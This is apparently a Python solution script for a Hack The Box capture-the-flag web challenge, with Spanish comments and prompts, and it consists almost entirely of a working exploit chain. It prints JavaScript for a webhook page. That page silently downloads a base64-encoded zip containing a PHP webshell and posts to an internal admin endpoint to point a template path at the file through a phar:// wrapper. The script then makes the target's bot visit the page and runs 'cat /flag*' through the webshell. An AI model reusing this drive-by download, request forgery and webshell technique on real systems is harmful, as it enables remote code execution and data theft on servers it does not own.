# By GuchiHacker

import sys
import requests
import re
import time

def get_flag(target):
    try:
        ip, port = target.split(":")

        html_code = """
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                (function() {
                    const zipinbase64 = 'UEsDBAoAAAAAAO6Of1qTlIdQEAAAABAAAAAJABwAbG9naW4ucGhwVVQJAAPvuupnL7vqZ3V4CwABBOkDAAAE6QMAADw/PWAkX0dFVFtfXWA/PgpQSwECHgMKAAAAAADujn9ak5SHUBAAAAAQAAAACQAYAAAAAAABAAAAtIEAAAAAbG9naW4ucGhwVVQFAAPvuupndXgLAAEE6QMAAATpAwAAUEsFBgAAAAABAAEATwAAAFMAAAAAAA==';

                    const binaryData = atob(zipinbase64);

                    const byteArray = new Uint8Array(binaryData.length);
                    for (let i = 0; i < binaryData.length; i++) {
                        byteArray[i] = binaryData.charCodeAt(i);
                    }
                    const blob = new Blob([byteArray], { type: 'application/zip' });

                    const fileUrl = URL.createObjectURL(blob);

                    const link = document.createElement('a');
                    link.href = fileUrl;
                    link.download = 'login.zip';  
                    link.style.display = 'none';

                    document.body.appendChild(link);
                    link.click();

                    document.body.removeChild(link);

                    URL.revokeObjectURL(fileUrl);
                })();
            });
            fetch("http://127.0.0.1:9000/api/admin/appSettings", {method: "POST", body: '{"template_path":"phar:///var/www/Downloads/login.zip.crdownload"}', credentials: "include"});
        </script>
        """

        print("\nCopia el siguiente código en el webhook:")
        print(html_code)
        input("Presiona Enter para continuar...")
        
        webhook_url = input("Introduce la URL del index.html del webhook (Ejemplo: http://172.17.0.1/index.html): ")
        
        # Realizar la request al endpoint /api/claimQuest
        url_claim = f"http://{ip}:{port}/api/claimQuest"
        data_claim = {"questId": "a", "questUrl": webhook_url, "companions": 0}
        
        response_claim = requests.post(url_claim, json=data_claim)
        response_claim.raise_for_status()
        print("Request a /api/claimQuest enviada correctamente.")
        
        time.sleep(5)
        
        # Realizar la request para obtener la flag
        url_flag = f"http://{ip}:{port}/?_=cat%20/flag*"
        response_flag = requests.get(url_flag)
        response_flag.raise_for_status()
        
        flag_match = re.search(r'HTB\{.*?\}', response_flag.text)
        if flag_match:
            print("Flag encontrada:", flag_match.group(0))
        else:
            print("No se encontró la flag en la respuesta.")
        
    except Exception as e:
        print("Error:", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <IP:PUERTO>")
    else:
        get_flag(sys.argv[1])
